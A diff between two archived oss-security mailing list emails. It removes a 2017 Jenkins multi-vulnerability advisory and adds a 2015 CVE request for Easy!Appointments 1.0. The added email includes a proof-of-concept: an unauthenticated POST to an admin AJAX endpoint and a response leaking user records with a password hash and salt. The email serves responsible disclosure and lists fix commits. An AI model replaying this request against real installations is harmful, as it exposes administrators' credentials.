@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2108" "Wednesday" "26" "April" "2017" "21:07:50" "+0200" "Daniel Beck" "ml@beckweb.net" "<B2478A17-5E89-484B-9728-1AB95D5EA865@beckweb.net>" "49" "[oss-security] Multiple vulnerabilities in Jenkins" nil nil nil "4" "2017042619:07:50" "[oss-security] Multiple vulnerabilities in Jenkins" (number mark "U       ml@beckweb.n Apr 26   49/2108  " thread-indent "\"[oss-security] Multiple vulnerabilities in Jenkins\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4390" "Monday" "27" "July" "2015" "16:14:21" "+0300" "Henri Salo" "henri@nerv.fi" "<20150727131421.GA20274@lakka.kapsi.fi>" "98" "[oss-security] CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and Insufficiently Protected Credentials vulnerabilities" nil nil nil "7" "2015072713:14:21" "[oss-security] CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and Insufficiently Protected Credentials vulnerabilities" (number mark "U       henri@nerv.f Jul 27   98/4390  " thread-indent "\"[oss-security] CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and Insufficiently Protected Credentials vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 13559 invoked by uid 550); 26 Apr 2017 19:08:04 -0000
+Received: (qmail 9833 invoked by uid 550); 27 Jul 2015 13:14:34 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,66 +11,117 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 9815 invoked from network); 27 Jul 2015 13:14:33 -0000
+Message-ID: <20150727131421.GA20274@lakka.kapsi.fi>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii; x-action=pgp-signed
+User-Agent: Mutt/1.5.21 (2010-09-15)
+X-SA-Exim-Connect-IP: 2001:1bc8:1004::1
+X-SA-Exim-Mail-From: fgeek@kapsi.fi
+X-SA-Exim-Scanned: No (on mail.kapsi.fi); SAEximRunCond expanded to false
+Cc: cve-assign@mitre.org, Alex Tselegidis <alextselegidis@gmail.com>
+Date: Mon, 27 Jul 2015 16:14:21 +0300
+From: Henri Salo <henri@nerv.fi>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13539 invoked from network); 26 Apr 2017 19:08:03 -0000
-From: Daniel Beck <ml@beckweb.net>
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Message-Id: <B2478A17-5E89-484B-9728-1AB95D5EA865@beckweb.net>
-Date: Wed, 26 Apr 2017 21:07:50 +0200
+Subject: [oss-security] CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and
+ Insufficiently Protected Credentials vulnerabilities
 To: oss-security@lists.openwall.com
-Mime-Version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-X-bounce-key: webpack.hosteurope.de;ml@beckweb.net;1493233683;768114ed;
-X-HE-SMSGID: 1d3SI3-0003CU-L3
-Subject: [oss-security] Multiple vulnerabilities in Jenkins
 
-The Jenkins project published updates today with fixes for multiple 
-vulnerabilities. Users should upgrade to the versions below:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-* Jenkins (weekly) 2.57
-* Jenkins (LTS) 2.46.2
+Product: Easy!Appointments Open Source Appointment Scheduler
+Product URL: http://easyappointments.org/
+Vendor: Alex Tselegidis
+Vulnerability Type:
+    Cross-Site Request Forgery (CWE-352)
+    Insufficiently Protected Credentials (CWE-522)
+Vulnerable Versions: 1.0
+Fixed Version: next release
+Vendor Notification: 2015-04-03
+Solution Status: Fixed by vendor
+Solution Date: 2015-05-28
+Public Disclosure: 2015-07-27
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://jenkins.io/security/advisory/2017-04-26/
+Vulnerability Details:
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
+The web application does not sufficiently verify whether a well-formed, valid,
+consistent request was intentionally provided by the user who submitted the
+request. The application transmits all user credentials to unauthenticated user
+and possibly allows other unauthorized actions.
 
-If you find security vulnerabilities in Jenkins, please report them as
-described here:
-https://jenkins.io/security/#reporting-vulnerabilities
+Proof-of-concept without authentication:
 
----
+"""
+POST /ea/backend_api/ajax_filter_admins HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0
+Iceweasel/31.6.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://example.com/ea/backend/users
+Content-Length: 4
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
 
-SECURITY-412 through SECURITY-420 / CVE-2017-1000356
-Multiple CSRF vulnerabilities, including immediate or delayed Jenkins
-restart, removing all configured update sites, installing and loading
-any plugin available on configured update sites, changing Jenkins
-system, security, and tool configuration, or creating new agents.
+key=
+"""
 
-SECURITY-429 / CVE-2017-1000353
-An unauthenticated remote code execution vulnerability allowed
-attackers to transfer a serialized Java SignedObject object to the
-remoting-based Jenkins CLI, that would be deserialized using a new
-ObjectInputStream, bypassing the existing blacklist-based protection
-mechanism.
+Returns:
 
-SECURITY-466 / CVE-2017-1000354
-The login command available in the remoting-based CLI stored the
-encrypted user name of the successfully authenticated user in a cache
-file used to authenticate further commands. Users with sufficient
-permission to create secrets in Jenkins, and download their encrypted
-values (e.g. with Job/Configure permission), were able to impersonate
-any other Jenkins user on the same instance.
+"""
+HTTP/1.1 200 OK
+Date: Thu, 09 Apr 2015 10:28:38 GMT
+Server: Apache/2.2
+X-Powered-By: PHP/5.4.39-0+deb7u2
+Set-Cookie: ci_session=*removed*; expires=Thu, 09-Apr-2015 12:28:38 GMT; path=/
+Keep-Alive: timeout=5, max=500
+Connection: Keep-Alive
+Content-Type: text/html
+Content-Length: 539
 
-SECURITY-503 / CVE-2017-1000355
-Jenkins uses the XStream library to serialize and deserialize XML. Its
-maintainer recently published a security vulnerability[1] that allows
-anyone able to provide XML to Jenkins for processing using XStream to
-crash the Java process. In Jenkins this typically applies to users
-with permission to create or configure items (jobs), views, or agents.
+[{"id":"84","first_name":"Henri","last_name":"Salo","email":"email@example.com","mobile_number":null,"phone_number":"04012345678","address":null,"city":null,"state":null,"zip_code":null,"notes":null,"id_roles":"1","settings":{"username":"henri","password":"1f40f9a5d17bedf197274fcc1886ef6ef4015b0f883513782d6fa437f8ab9af7","salt":"547ca602bda6a2a97ff4222fb71d61c75436da1ebf86a41c33219d11f1f4568e","working_plan":null,"notifications":"0","google_sync":"0","google_token":null,"google_calendar":null,"sync_past_days":"5","sync_future_days":"5"}}]
+"""
 
+Fixed in following commit:                                                                                                                                                                                                                                                      
+    https://github.com/alextselegidis/easyappointments/commit/1f73e7fcbc2c06505178200567ac905ae8570326
 
-1: http://www.openwall.com/lists/oss-security/2017/04/03/4
+Related commits to add CSRF protection:
+    https://github.com/alextselegidis/easyappointments/commit/f223ffa343ad91d046b4469248f6479edf1718d7
+    https://github.com/alextselegidis/easyappointments/commit/daf4865c290c58b66f73507a0ae1ec41987ad840
+    https://github.com/alextselegidis/easyappointments/commit/d88c138d2dd35820e355f0d7f3b93db3cc5473e8
+    https://github.com/alextselegidis/easyappointments/commit/ad8c9b6522c560ac5b6309f62f8b3e2319483d54
+    https://github.com/alextselegidis/easyappointments/commit/ecbe5600df03ac970e4e743215d3b3be6e1e6860
+
+References:
+    https://scapsync.com/cwe/CWE-352
+    https://scapsync.com/cwe/CWE-522
+    https://cwe.mitre.org/data/definitions/352.html
+    https://cwe.mitre.org/data/definitions/522.html
+    https://en.wikipedia.org/wiki/Cross-site_request_forgery
+    https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
+    https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet
+
+- -- 
+Henri Salo
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+
+iQIcBAEBAgAGBQJVti6tAAoJECet96ROqnV0mlwP/R82KPUH15elyTfqeImCsc/6
+FpUiZrvQPvW2saPlweec6vLsdr361dZb3wfSLpltyDK/b/XFhRxGOqufjETDfsrr
+tP5y7OqvpzKisu+itOpsFBiFppuLD3UCK2GsWyFM0JHrcSkOyG5dKQ1LGkQzZObD
+vG2U6ofB7PRoW0C9iorlUVa7InUt9sEWojwjsONtacbibiLD4jIqui1YUs0Dg9yj
+QUTBKd8RcSUddkZYzhKIkhBYgdaMdSO1ObE1taLZlK2lfQCI9L5pAXAf4k8YRP5X
+N+wiX6LfmVcb+8Os0iJpsFZLT9oe0B3Kl1elm51MWFyA00P5M7B8x3svkeH34LUH
+OBDyE92+LH352zn9nDIpZFeEwoEZTEZak5zAKM0L1i+qXU9LRwwZXahFvY4VyZng
+mvqf4tZEogJV55q27HaWr1595b7MEHBexiNQmFrC5k9l2fFzVZRnlaIHLYjGvwpf
+vSFHG8u/YpSmOOM3FM/yRZlgR21jM2cdYIDs5vpQkGfjdSW61CdQwp6m/j1znkqH
+jjxYiqIhp9me4xEWmAhgm26HkQcpCHlEBwA2N2x9RvnS/Lw6oPHln8dxhu4OP3mr
+Eq43X2Zz8kQJkZuQnufAzmtMYxvKmzhfVYWREBzhohox+nXImqlAvYxzCQzBEGBE
+++lf9BJDbx+CMendxx9Z
+=cYYp
+-----END PGP SIGNATURE-----
